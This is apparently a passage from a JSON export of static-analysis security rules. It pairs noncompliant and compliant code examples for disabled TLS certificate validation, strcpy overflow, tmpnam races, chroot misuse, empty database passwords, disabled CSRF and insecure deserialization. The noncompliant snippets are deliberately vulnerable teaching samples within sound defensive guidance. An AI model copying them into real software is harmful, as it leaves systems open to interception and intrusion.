        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to\nuse the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks\n{\n    virtual void tls_verify_cert_chain(\n              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,\n              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,\n              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,\n              Botan::Usage_Type usage,\n              const std::string &amp;hostname,\n              const Botan::TLS::Policy &amp;policy)\n    override  { }\n};\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks { };\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5801": {
        "name": "Using \"strcpy\" or \"wcscpy\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to\n<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and\n<code>wcscpy</code>, but they have their own set of issues (see <a href='/coding_rules#rule_key=objc%3AS5816'>S5816</a>), and you should probably prefer another more adapted\nalternative.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the source or the destination pointer is <code>null</code> </li>\n  <li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final\n  <code>null</code> character) can be larger than the size of the destination buffer. </li>\n  <li> There is an overlap between source and destination </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to\n  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in\n  FreeBSD </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, src); // Sensitive: might overflow\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char *dest = malloc(strlen(src) + 1); // For the final 0\n  strcpy(dest, src); // Compliant: we made sure the buffer is large enough\n  int r= doSomethingWith(dest);\n  free(dest);\n  return r;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "objc:S5824": {
        "name": "Using \"tmpnam\", \"tmpnam_s\" or \"tmpnam_r\" is security-sensitive",
        "htmlDesc": "<p>The functions \"tmpnam\", \"tmpnam_s\" and \"tmpnam_r\" are all used to return a file name that does not match an existing file, in order for the\napplication to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time\nthe application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed\nwere trustworthy.</p>\n<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such\nfunctions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary\nfolder, not a temporary file.</p>\n<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer\noverflow.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that several threads call any of these functions simultaneously </li>\n  <li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights\n  </li>\n  <li> The buffers passed to these functions are respectively smaller than\n    <ul>\n      <li> <code>L_tmpnam</code> for <code>tmpnam</code> </li>\n      <li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li>\n      <li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or\n  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li>\n  <li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file\n  and fails if the file already exists. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *tempData) {\n  char *path = tmpnam(NULL); // Sensitive\n  FILE* f = fopen(tmpnam, \"w\");\n  fputs(tempData, f);\n  fclose(f);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *tempData) {\n  // The file will be opened in \"wb+\" mode, and will be automatically removed on normal program exit\n  FILE* f = tmpfile(); // Compliant\n  fputs(tempData, f);\n  fclose(f);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions\">CERT, CON33-C.</a> - Avoid\n  race conditions when using library functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.+Do+not+create+temporary+files+in+shared+directories\">CERT, FIO21-C.</a> - Do\n  not create temporary files in shared directories </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "objc:S5802": {
        "name": "Changing directories improperly when using \"chroot\" is security-sensitive",
        "htmlDesc": "<p>The purpose of creating a jail, the \"virtual root directory\" created with chroot-type functions, is to limit access to the file system by isolating\nthe process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still\naccess to unauthorized resources outside of the \"jail\".</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application changes the working directory before or after running chroot. </li>\n  <li> The application uses a path inside the jail directory as working directory. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Change the current working directory to the root directory after switching to a jail directory.</p>\n<h2>Sensitive Code Example</h2>\n<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>\nfunction:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nchroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value\n</pre>\n<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code\nshould be checked:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nchroot(root_dir); // Sensitive: missing check of the return value\nconst char* any_dir = \"/any/\";\nchdir(any_dir); // Sensitive: missing check of the return value\n</pre>\n<h2>Compliant Solution</h2>\n<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the\nreturn code of both functions:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\n\nif (chdir(root_dir) == -1) {\n  exit(-1);\n}\n\nif (chroot(root_dir) == -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked\n  exit(-1);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/243\">CWE-243 - Creation of chroot Jail Without Changing Working Directory</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chdir.2.html\">man7.org</a> - chdir </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chroot.2.html\">man7.org</a> - chroot </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2115": {
        "name": "A secure password should be used when connecting to a database",
        "htmlDesc": "<p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>\n<h2>Why is this an issue?</h2>\n<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting\nthis vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication\ncredentials.</p>\n<h3>What is the potential impact?</h3>\n<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially\nleading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and\nintegrity of the database and the data it contains.</p>\n<h4>Unauthorized Access to Sensitive Data</h4>\n<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can\ninclude personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the\ndatabase. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to\nidentity theft, financial loss, or reputational damage.</p>\n<h4>Compromise of System Integrity</h4>\n<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the\nentire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,\nunauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the\norganization to further security risks.</p>\n<h4>Unwanted Modifications or Deletions</h4>\n<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a\nsignificant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For\nexample, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business\nprocesses and potentially leading to financial and legal consequences.</p>\n<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system\ncompromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain\nsystem integrity, and protect the organization from potential harm.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code uses an empty password to connect to a MySQL database.</p>\n<p>The vulnerability can be fixed by using a strong password retrieved from an environment variable <code>MYSQL_SECURE_PASSWORD</code>. This\nenvironment variable is set during deployment. It should be strong and different for each database.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"401\" data-diff-type=\"noncompliant\">\n$conn = new mysqli($servername, $username, \"\"); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"401\" data-diff-type=\"compliant\">\n$password = getenv('MYSQL_SECURE_PASSWORD');\n$conn = new mysqli($servername, $username, $password);\n</pre>\n<h3>Pitfalls</h3>\n<h4>Hard-coded passwords</h4>\n<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.\nHere are a few reasons why it is not recommended:</p>\n<ol>\n  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or\n  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>\n  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be\n  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>\n  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control\n  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>\n</ol>\n<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,\nconfiguration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information\nfrom the codebase.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S4502": {
        "name": "Disabling CSRF protections is security-sensitive",
        "htmlDesc": "<p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive\nactions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the\napplication.</p>\n<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a\nhidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses cookies to authenticate users. </li>\n  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>\n  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Protection against CSRF attacks is strongly recommended:\n    <ul>\n      <li> to be activated by default for all <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">unsafe HTTP\n      methods</a>. </li>\n      <li> implemented, for example, with an unguessable CSRF token </li>\n    </ul>  </li>\n  <li> Of course all sensitive operations should not be performed with <a\n  href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods\">safe HTTP</a> methods like <code>GET</code> which are designed to be\n  used only for information retrieval. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://laravel.com/docs/8.x/csrf#csrf-excluding-uris\">Laravel VerifyCsrfToken middleware</a></p>\n<pre>\nuse Illuminate\\Foundation\\Http\\Middleware\\VerifyCsrfToken as Middleware;\n\nclass VerifyCsrfToken extends Middleware\n{\n    protected $except = [\n        'api/*'\n    ]; // Sensitive; disable CSRF protection for a list of routes\n}\n</pre>\n<p>For <a href=\"https://symfony.com/doc/current/security/csrf.html#csrf-protection-in-symfony-forms\">Symfony Forms</a></p>\n<pre>\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n\nclass Controller extends AbstractController {\n\n  public function action() {\n    $this-&gt;createForm('', null, [\n      'csrf_protection' =&gt; false, // Sensitive; disable CSRF protection for a single form\n    ]);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://laravel.com/docs/8.x/csrf#csrf-excluding-uris\">Laravel VerifyCsrfToken middleware</a></p>\n<pre>\nuse Illuminate\\Foundation\\Http\\Middleware\\VerifyCsrfToken as Middleware;\n\nclass VerifyCsrfToken extends Middleware\n{\n    protected $except = []; // Compliant\n}\n</pre>\n<p>Remember to add <a href=\"https://laravel.com/docs/8.x/blade#csrf-field\">@csrf</a> blade directive to the relevant forms when removing an element\nfrom $except. Otherwise the form submission will stop working.</p>\n<p>For <a href=\"https://symfony.com/doc/current/security/csrf.html#csrf-protection-in-symfony-forms\">Symfony Forms</a></p>\n<pre>\nuse Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n\nclass Controller extends AbstractController {\n\n  public function action() {\n    $this-&gt;createForm('', null, []); // Compliant; CSRF protection is enabled by default\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p>CakePHP 1.x, 2.x:</p>\n<pre>\nConfigure::write('debug', 1); // Sensitive: development mode\nor\nConfigure::write('debug', 2); // Sensitive: development mode\nor\nConfigure::write('debug', 3); // Sensitive: development mode\n</pre>\n<p>CakePHP 3.0:</p>\n<pre>\nuse Cake\\Core\\Configure;\n\nConfigure::config('debug', true); // Sensitive: development mode\n</pre>\n<p>WordPress:</p>\n<pre>\ndefine( 'WP_DEBUG', true ); // Sensitive: development mode\n</pre>\n<h2>Compliant Solution</h2>\n<p>CakePHP 1.2:</p>\n<pre>\nConfigure::write('debug', 0); // Compliant; this is the production mode\n</pre>\n<p>CakePHP 3.0:</p>\n<pre>\nuse Cake\\Core\\Configure;\n\nConfigure::config('debug', false); // Compliant:  \"0\" or \"false\" for CakePHP 3.x is suitable (production mode) to not leak sensitive data on the logs.\n</pre>\n<p>WordPress:</p>\n<pre>\ndefine( 'WP_DEBUG', false ); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S4508": {
        "name": "Deserializing objects from an untrusted source is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Deserializing objects is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17672\">CVE-2017-17672</a>: vBulletin: Unserialize PHP Code Execution </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000167\">CVE-2018-1000167</a>: Jenkins Pipeline: arbitrary code execution\n  vulnerability </li>\n</ul>\n<p>Object deserialization from an untrusted source can lead to unexpected code execution. Deserialization takes a stream of bits and turns it into an\nobject. If the stream contains the type of object you expect, all is well. But if you’re deserializing data coming from untrusted input, and an\nattacker has inserted some other type of object, you’re in trouble. Why? <a href=\"https://www.owasp.org/index.php/PHP_Object_Injection\">A known attack\nscenario</a> involves the creation of a serialized PHP object with crafted attributes which will modify your application’s behavior. This attack\nrelies on <a href=\"https://php.net/manual/en/language.oop5.magic.php\">PHP magic methods</a> like <code>__desctruct</code>, <code>__wakeup</code> or\n<code>__string</code>. The attacker doesn’t necessarily need the source code of the targeted application to exploit the vulnerability, he can also\nrely on the presence of open-source component and use <a href=\"https://github.com/ambionics/phpggc\">tools to craft malicious payloads</a>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> an attacker could have tampered with the source provided to the deserialization function </li>\n  <li> you are using an unsafe deserialization function </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To prevent insecure deserialization, it is recommended to:</p>\n<ul>\n  <li> Use safe libraries that do not allow code execution at deserialization. </li>\n  <li> Not communicate with the outside world using serialized objects </li>\n  <li> Limit access to the serialized source\n    <ul>\n      <li> if it is a file, restrict the access to it. </li>\n      <li> if it comes from the network, restrict who has access to the process, such as with a Firewall or by authenticating the sender first. </li>\n    </ul>  </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\">OWASP - Deserialization of untrusted data</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#OBJECT_DESERIALIZATION\">OBJECT_DESERIALIZATION </a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://www.php.net/manual/en/class.ziparchive.php\">ZipArchive</a> module:</p>\n<pre>\n$zip = new ZipArchive();\nif ($zip-&gt;open($file) === true) {\n    $zip-&gt;extractTo('.'); // Sensitive\n    $zip-&gt;close();\n}\n</pre>\n<p>For <a href=\"https://www.php.net/manual/en/ref.zip.php\">Zip</a> module:</p>\n<pre>\n$zip = zip_open($file);\nwhile ($file = zip_read($zip)) {\n    $filename = zip_entry_name($file);\n    $size = zip_entry_filesize($file);\n\n    if (substr($filename, -1) !== '/') {\n        $content = zip_entry_read($file, zip_entry_filesize($file)); // Sensitive - zip_entry_read() uses zip_entry_filesize()\n        file_put_contents($filename, $content);\n    } else {\n        